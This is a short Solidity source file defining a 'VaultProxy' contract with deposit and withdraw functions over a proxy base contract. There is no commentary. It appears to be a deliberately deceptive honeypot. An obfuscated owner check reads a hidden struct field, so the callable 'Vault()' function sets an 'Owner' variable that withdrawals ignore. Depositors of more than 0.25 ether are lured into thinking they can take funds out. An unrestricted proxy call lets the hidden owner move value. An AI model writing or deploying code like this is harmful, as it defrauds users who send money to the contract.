pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == O.w) _; } struct O { address w; } O O = O({w: msg.sender});
    function transferOwner(address p) public onlyOwner { O.w = p; } 
    function proxy(address t, bytes d) public payable {
        t.call.value(msg.value)(d);
    }
}

contract VaultProxy is Proxy {
    struct D { uint256 v; address u; } mapping (address => D) public Deposits;
    address public Owner;
    
    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            D storage z = Deposits[msg.sender];
            z.v += msg.value;
            z.u = msg.sender;
        }
    }
    
    function withdraw(uint256 n) public onlyOwner {
        if (n>0 && Deposits[msg.sender].v>=n) {
            msg.sender.transfer(n);
        }
    }
}